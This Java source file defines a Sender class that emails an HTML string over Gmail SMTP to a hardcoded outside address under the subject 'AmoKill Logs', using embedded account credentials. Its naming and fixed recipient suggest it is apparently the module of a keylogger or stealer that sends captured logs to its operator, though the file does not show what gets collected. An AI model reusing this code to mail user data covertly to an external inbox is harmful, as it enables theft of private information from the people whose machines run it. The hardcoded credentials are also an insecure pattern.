package handlers;

import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Properties;

public class Sender {

    private Sender() {}

    public static void sendMail(String emailBody) {
        String to = "loggerinfo71@gmail.com";
        String from = config.Configuration.getYouLogMailBox();

        Properties properties = System.getProperties();

        //setup Mail Server
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "465");
        properties.put("mail.smtp.ssl.enable", "true");
        properties.put("mail.smtp.auth", "true");

        Session session = Session.getInstance(properties, new javax.mail.Authenticator() {

            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication("uss.jeka@gmail.com", "PASSWORD");
            }

        });

        session.setDebug(true);

        try {
            MimeMessage message = new MimeMessage(session);
            message.setFrom(new InternetAddress(from));
            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
            message.setSubject("AmoKill Logs");
            message.setContent(emailBody, "text/html");

            System.out.println("Sending...");
            Transport.send(message);

            System.out.println("Sent message succesfuly!");
        } catch (MessagingException mex) {
            mex.printStackTrace();
        }

    }
}
